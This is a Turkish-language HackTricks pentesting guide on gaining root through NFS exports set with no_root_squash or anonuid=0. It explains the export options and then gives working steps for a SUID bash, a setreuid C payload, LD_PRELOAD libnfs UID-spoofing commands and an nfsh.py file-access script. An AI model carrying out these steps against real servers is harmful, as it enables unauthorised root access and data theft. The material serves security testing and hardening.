# NFS No Root Squash Misconfiguration ile Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Squashing Hakkında Temel Bilgiler

NFS AUTH_SYS/AUTH_UNIX kullanıldığında sunucu, dosya izinlerini her RPC isteğinde gönderilen `uid` ve `gid` değerlerine göre denetler. Kerberos gibi diğer güvenlik türleri farklı kimlik bilgileri kullanır ve sunucu, izinleri denetlemeden önce sayısal kimlik bilgilerini eşleyebilir.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Her UID ve GID'yi varsayılan olarak Linux'ta `nobody` (65534) olan anonim hesaba eşler. Root dışındaki isteklerde varsayılan ayar `no_all_squash` olur.<sup>[[4]](#references)</sup>
- **`root_squash`**: Linux'ta varsayılan ayardır ve UID/GID 0 (root) içeren istekleri anonim hesaba eşler; diğer UID ve GID'ler squash edilmez.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Root squashing'i devre dışı bırakır; böylece UID/GID 0 içeren istekler sunucuda root olarak değerlendirilebilir.<sup>[[4]](#references)</sup>

İzin verilen bir istemci, **`no_root_squash`** ile yapılandırılmış ve yazılabilir bir **`/etc/exports`** export'unu mount edebiliyorsa, UID/GID 0 istekleriyle sunucunun root kullanıcısı olarak buraya yazabilir.<sup>[[4]](#references)</sup>

`root_squash` yalnızca UID/GID 0'ı yeniden eşler; AUTH_SYS altında, izin verilen bir istemcinin **sıfır olmayan sayısal UID/GID** değeri sunucudaki başka bir hesapla yine eşleşebilir. Bu nedenle istemci söz konusu sayısal kimlikle dosya oluşturabiliyor ve sunucu erişime izin veriyorsa, yazılabilir bir export root squashing etkin olsa bile kullanıcılar arası bir yol oluşturabilir. SUID/SGID devri için ayrıca oluşan dosyanın sahibini, çalıştırma iznini, sunucudaki mount'un `nosuid` durumunu, ACL'leri ve SELinux veya diğer politikaları doğrulayın. Export edilen yol adı, `rw` seçeneği ya da eşleşen numara tek başına istemcinin erişimine izin verildiğini, export'un etkin olduğunu veya iki sunucunun aynı etkin kimlik eşlemesini kullandığını kanıtlamaz. `/etc/exports` dosyasını ve yerel meta verileri pasif olarak inceleyin; envanter çıkarırken yeni bir share mount etmeyin veya test dosyası oluşturmayın.<sup>[[4]](#references)[[5]](#references)</sup>

**NFS** hakkında daha fazla bilgi için:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Root ile eşdeğer anonim eşleme

Yalnızca `no_root_squash` olup olmadığını kontrol etmeyin. `root_squash,anonuid=0,anongid=0` ayarında, istemcinin UID/GID 0 isteği squash edilerek **yeniden root'a** eşlenir. `all_squash,anonuid=0,anongid=0` ayarında ise root olmayan istemci kimlikleri bile sunucuda root'a eşlenir. Yazılabilir bir `sec=sys` export'unda bu iki yapılandırma da aşağıdaki SUID devrinde kullanılan root sahipliğinde dosya oluşturma olanağını sağlayabilir; izin verilen istemci ve kurban makinenin mount'u ile ilgili kısıtlamalar yine geçerlidir.<sup>[[4]](#references)</sup>

Sunucuda, etkin export'u ve **eşleşen istemciye** ait seçenekleri incelemek için `exportfs -v` kullanın. Bu seçeneklere `rw`, `sec=`, squash modu ve `anonuid`/`anongid` dahildir. Yapılandırmayı incelerken `/etc/exports.d/*.exports` dosyalarına da bakın; yalnızca `/etc/exports` dosyasını incelemek eksik bilgi verebilir.<sup>[[4]](#references)[[6]](#references)</sup>

```bash
# Example /etc/exports entries: squashed requests map to server UID 0
/srv/share 192.0.2.10(rw,sec=sys,root_squash,anonuid=0,anongid=0)
/srv/share 192.0.2.11(rw,sec=sys,all_squash,anonuid=0,anongid=0)
```

### Uzaktan Exploit

Option 1 using bash:
- İzin verilen bir istemcide, yazılabilir bir export'u root olarak mount edin, **`/bin/bash`** dosyasını içine kopyalayın, **SUID** bitini ayarlayın ve dosyayı `nosuid` kullanmayan bir victim mount üzerinden çalıştırın.<sup>[[2]](#references)[[4]](#references)</sup>
    - Yüklenen dosyanın sahibi root olarak kalması için sunucu, **`no_root_squash`** ile istemcinin UID 0 değerini korumalı veya isteği **`anonuid=0`** ile UID 0'a eşlemelidir. Aksi takdirde başka bir hesap için SUID binary oluşturmak, ancak istemci bu dosyayı söz konusu hesabın sayısal UID/GID değeriyle oluşturabiliyor veya sahibi olabiliyorsa mümkündür.<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Option 2, derlenmiş C kodu kullanarak:
- İzin verilen bir client'tan dizini mount edin, SUID izinlerini kötüye kullanan derlenmiş bir payload kopyalayın, **SUID** bitini ayarlayın ve victim üzerinde çalıştırın (bazı [C SUID payload'ları](../processes-crontab-systemd-dbus/payloads-to-execute.md#c) için bkz.).
    - Öncekiyle aynı kısıtlamalar

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Yerel Exploit

> [!TIP]
> Makinenizden kurban makineye bir **tunnel oluşturabiliyorsanız, gerekli portları tunnel ederek bu privilege escalation'ı istismar etmek için Remote sürümünü yine de kullanabilirsiniz**.\
> `/etc/exports` dışa aktarımı kurbanın IP adresiyle kısıtladığında aşağıdaki yöntem işe yarar: uzak istemci bunu mount edemez, ancak yerel teknik, izin verilen host üzerinde zaten mount edilmiş paylaşım üzerinden çalışabilir.<sup>[[2]](#references)</sup>\
> Bu ayrıcalıksız libnfs yöntemi için **`/etc/exports`** içindeki dışa aktarımda `insecure` flag'i kullanılmalıdır; böylece süreç ayrılmış olmayan bir kaynak portu kullanabilir. Varsayılan `secure`'dür; ancak ayrılmış bir porta bind yapabilen bir süreç bu seçeneğe ihtiyaç duymaz.<sup>[[1]](#references)[[4]](#references)</sup>

### Temel Bilgiler

Bir NFSv3 AUTH_UNIX istemcisi her çağrıda etkin UID, GID ve gruplarını gönderir; sunucu da izin denetimleri için bunları kullanır. Bu yerel teknik, [libnfs](https://github.com/sahlberg/libnfs) aracılığıyla RPC kimlik bilgilerini sahteleyerek bu modelden yararlanır; preload modülü, NFS context içindeki UID/GID değerlerinin geçersiz kılınmasını destekler.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Kütüphaneyi Derleme

libnfs örneği hedef kernel için düzenleme gerektirebilir; burada kullanılan anlatımda, preload modülünü derlemeden önce fallocate syscall'larının yorum satırına alınması özellikle belirtilmiştir.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Exploit'in Uygulanması

Örnek, shell başlatan küçük bir C yardımcı programı oluşturur, ardından bunu paylaşıma yerleştirir ve SUID-root yapmak için NFS bağlamında UID 0 ile `ld_nfs.so` kullanır.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Exploit kodunu derleyin:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Exploit'i share'e koyun ve UID'yi taklit ederek izinlerini değiştirin**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Root yetkileri elde etmek için exploit'i çalıştırın**.<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### Bonus: Gizli Dosya Erişimi için NFShell

Root erişimi sağlandıktan sonra bu `nfsh.py` kalıbı, bir komutu çalıştırmadan önce etkin UID'yi hedef dosyanın UID'sine ayarlar; böylece sahipliği özyinelemeli olarak değiştirmeden erişim sağlanır.<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

Şu şekilde çalıştır:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```



## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Daha az bilinen bir NFS yetki yükseltme hikâyesi](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — Linux man sayfası](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: NFS Version 3 Protokolü Spesifikasyonu](https://datatracker.ietf.org/doc/html/rfc1813)
- [6] [exportfs(8) — Linux man sayfası](https://man7.org/linux/man-pages/man8/exportfs.8.html)
{{#include ../../banners/hacktricks-training.md}}
